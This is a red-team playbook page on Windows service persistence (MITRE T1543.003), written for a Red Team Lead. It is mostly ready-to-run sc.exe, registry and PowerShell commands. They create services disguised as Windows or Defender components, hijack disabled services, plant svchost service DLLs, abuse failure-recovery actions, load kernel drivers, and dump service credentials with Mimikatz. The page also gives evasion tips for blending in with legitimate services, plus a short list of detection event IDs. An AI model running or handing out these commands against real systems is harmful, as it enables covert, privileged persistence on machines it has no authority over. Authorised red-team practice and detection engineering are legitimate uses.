# Service-Based Persistence

> **MITRE ATT&CK**: Persistence / Privilege Escalation > T1543.003 - Create or Modify System Process: Windows Service
> **Platforms**: Windows
> **Required Privileges**: Admin (service creation requires elevated privileges)
> **OPSEC Risk**: Medium (services are legitimate but creation is audited)

---

## Strategic Overview

Windows services provide robust persistence because they start automatically at boot, run with SYSTEM privileges by default, and are managed by the Service Control Manager (SCM). For a Red Team Lead, services offer reliable persistence that survives reboots and user logoffs. However, service creation is well-audited (Event ID 7045) and modern EDR products monitor for new service installations. The strategic approach involves modifying existing services rather than creating new ones, using service DLL hijacking, and leveraging service failure recovery mechanisms as a stealthier alternative to direct service creation. Services are particularly valuable when SYSTEM-level persistence is required and when the operation timeline extends beyond a single user session.

## Technical Deep-Dive

### Creating New Services

```bash
# Create a basic service (runs as SYSTEM by default)
sc create "WindowsHealthService" binpath= "C:\ProgramData\svchost.exe" start= auto displayname= "Windows Health Service"

# Create service with description for legitimacy
sc create "WinDefendUpdate" binpath= "C:\ProgramData\defender_svc.exe" start= auto displayname= "Windows Defender Update Service"
sc description "WinDefendUpdate" "Provides real-time protection definition updates for Windows Defender"

# Create service that runs specific command
sc create "UpdateSvc" binpath= "cmd.exe /c powershell.exe -w hidden -enc AAAA..." start= auto

# Create service running as specific user
sc create "AppSvc" binpath= "C:\ProgramData\app.exe" obj= "DOMAIN\svcaccount" password= "Password123" start= auto

# Start the service
sc start "WindowsHealthService"

# Query service status
sc query "WindowsHealthService"
sc qc "WindowsHealthService"
```

### Modifying Existing Services (Stealthier)

```bash
# Find services that are disabled or rarely used
sc query state= all | findstr /i "DISABLED"
wmic service where "StartMode='Disabled'" get Name,PathName,StartMode

# Modify existing service binary path
sc config "AnyExistingDisabledService" binpath= "C:\ProgramData\payload.exe" start= auto
sc start "AnyExistingDisabledService"

# Backup original path for cleanup
sc qc "TargetService" | findstr "BINARY_PATH_NAME"

# Modify service to load DLL via svchost
sc config "TargetService" binpath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TargetService\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\ProgramData\payload.dll" /f
```

### DLL Hijacking in Service DLL Search Order

```bash
# Identify services loading DLLs from writable paths
# Common pattern: service loads DLL from application directory
# If directory has weak permissions, replace or plant a DLL

# Enumerate service image paths
wmic service get name,pathname | findstr /v "C:\Windows"

# Check permissions on service binary directories
icacls "C:\Program Files\VulnerableApp\"

# Plant DLL in service's search path
# Windows DLL search order for services:
# 1. Known DLLs registry
# 2. Application directory
# 3. System32
# 4. System directory
# 5. Windows directory
# 6. PATH directories
```

### Service Failure Recovery Actions

Services can be configured to execute a command when they fail -- a stealthy persistence mechanism.

```bash
# Configure service to run payload on failure
sc failure "ExistingService" reset= 0 actions= run/60000/run/60000/run/60000
sc failureflag "ExistingService" 1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ExistingService" /v "FailureCommand" /t REG_SZ /d "C:\ProgramData\payload.exe" /f

# Create a service designed to fail immediately, triggering the recovery action
sc create "CrashSvc" binpath= "C:\Windows\System32\cmd.exe /c exit 1" start= auto
sc failure "CrashSvc" reset= 0 actions= run/5000 command= "C:\ProgramData\payload.exe"
```

### Service Account Credential Abuse

```bash
# Services running as domain accounts store credentials in LSA secrets
# Extract service account credentials
# Via Mimikatz:
# sekurlsa::logonpasswords
# lsadump::secrets

# Create service with managed service account (harder to detect)
sc create "ManagedSvc" binpath= "C:\ProgramData\svc.exe" obj= "DOMAIN\gMSA_Account$" start= auto
```

### Kernel-Mode Services (Drivers)

```bash
# Load a kernel driver (requires admin + driver signing or test signing mode)
sc create "EvilDriver" binpath= "C:\ProgramData\driver.sys" type= kernel start= auto

# Enable test signing (requires reboot, very noisy)
bcdedit /set testsigning on

# Load driver via service control manager
sc start "EvilDriver"

# Alternative: Exploit vulnerable signed driver (BYOVD - Bring Your Own Vulnerable Driver)
# Load legitimate but vulnerable driver, exploit it to load unsigned code
# Examples: RTCore64.sys, DBUtil_2_3.sys, etc.
```

### PowerShell Service Management

```powershell
# Create service via PowerShell
New-Service -Name "HealthMonitor" -BinaryPathName "C:\ProgramData\monitor.exe" -DisplayName "System Health Monitor" -Description "Monitors system health metrics" -StartupType Automatic

# Modify existing service
Set-Service -Name "TargetService" -Status Running -StartupType Automatic

# WMI-based service creation (alternative method)
Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "UpdateSvc"
    DisplayName = "Windows Update Helper"
    PathName = "C:\ProgramData\updater.exe"
    ServiceType = [byte]16
    StartMode = "Automatic"
}
```

### Service DLL (svchost.exe Hosted)

```bash
# Create a service hosted by svchost.exe (blends with legitimate svchost instances)

# 1. Create service registry entries
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc" /v "ImagePath" /t REG_EXPAND_SZ /d "%SystemRoot%\System32\svchost.exe -k netsvcs" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc" /v "Type" /t REG_DWORD /d 32 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc" /v "Start" /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc" /v "ObjectName" /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc" /v "DisplayName" /t REG_SZ /d "Windows Event Collector" /f

# 2. Point to malicious DLL
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\Windows\System32\evil.dll" /f

# 3. Add to existing svchost group (or create custom group)
# Append service name to existing group in:
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\netsvcs
```

## Detection & Evasion

### Detection Mechanisms
- **Event ID 7045**: New service installation (System log)
- **Event ID 4697**: Service installation (Security log, if auditing enabled)
- **Sysmon Event ID 1**: Process creation from services.exe
- **Sysmon Event ID 12-14**: Registry modifications under Services key
- **EDR monitoring**: New service creation, service binary path changes
- **Autoruns**: Enumerates all services and their binaries

### Evasion Techniques
- Modify existing disabled services instead of creating new ones
- Use service failure recovery actions instead of direct service binaries
- Host service DLLs in svchost.exe to blend with legitimate services
- Name services to match Microsoft naming patterns
- Place binaries in legitimate directories (C:\Program Files\)
- Use service accounts that match the naming convention of the environment

### OPSEC Considerations
- Event ID 7045 is a high-fidelity detection for new services -- it cannot be suppressed
- sc.exe command-line arguments are captured in process creation logs
- Services running executables from unusual paths (C:\Temp, C:\Users) are immediately suspicious
- Kernel drivers require driver signing or test signing mode, both of which are conspicuous
- Always document the original service configuration for cleanup

## Cross-References

- `04-persistence/registry-persistence.md` - Service registry key structure
- `08-privilege-escalation/` - Service exploitation for privilege escalation
- `09-lateral-movement/` - Remote service creation for lateral movement
- `06-defense-evasion/` - BYOVD techniques for EDR bypass

## References

- MITRE T1543.003: https://attack.mitre.org/techniques/T1543/003/
- sc.exe Documentation: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create
- Service DLL persistence: https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll
- BYOVD Attack Research: https://www.mandiant.com/resources/blog/hunting-attestation-signed-malware
